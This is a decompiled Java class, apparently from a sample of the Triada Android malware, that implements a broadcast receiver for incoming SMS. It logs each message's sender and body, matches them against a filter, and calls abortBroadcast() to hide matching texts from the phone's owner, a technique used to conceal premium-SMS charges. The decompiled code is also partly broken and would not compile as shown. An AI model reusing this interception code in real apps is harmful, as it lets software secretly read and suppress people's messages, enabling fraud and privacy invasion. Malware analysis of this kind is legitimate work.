package com.android.essdk.eyou.sms;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import com.android.essdk.eyou.e.b;
import com.android.essdk.eyou.sms.a.c;

public class MmsSmsReceiver extends BroadcastReceiver {
  public static long a = 0L;
  
  Context b;
  
  public void onReceive(Context paramContext, Intent paramIntent) {
    SmsMessage smsMessage;
    Object[] arrayOfObject;
    this.b = paramContext;
    String str = paramIntent.getAction();
    b.b("action", str);
    if (str.equals("android.provider.Telephony.SMS_RECEIVED")) {
      Bundle bundle = paramIntent.getExtras();
      if (bundle != null && !bundle.isEmpty()) {
        arrayOfObject = (Object[])bundle.get("pdus");
        int i = arrayOfObject.length;
        byte b = 0;
        while (true) {
          if (b < i) {
            smsMessage = SmsMessage.createFromPdu((byte[])arrayOfObject[b]);
            String str1 = smsMessage.getOriginatingAddress();
            b.b("MmsSmsReceiver", "收到短信。phone：" + str1 + "body:" + smsMessage.getMessageBody());
            if (c.a(null).a().a(str1, smsMessage.getMessageBody(), null)) {
              abortBroadcast();
              b.b(str1, "一条短消息被拦截成功！");
            } 
            b++;
            continue;
          } 
          return;
        } 
      } 
      return;
    } 
    if (smsMessage.equals("android.provider.Telephony.WAP_PUSH_RECEIVED")) {
      b.f("fdd", "彩信消息！");
      arrayOfObject.getByteArrayExtra("data");
    } 
  }
}


/* Location:              /home/fahim/Desktop/triada1-dex2jar.jar!/com/android/essdk/eyou/sms/MmsSmsReceiver.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */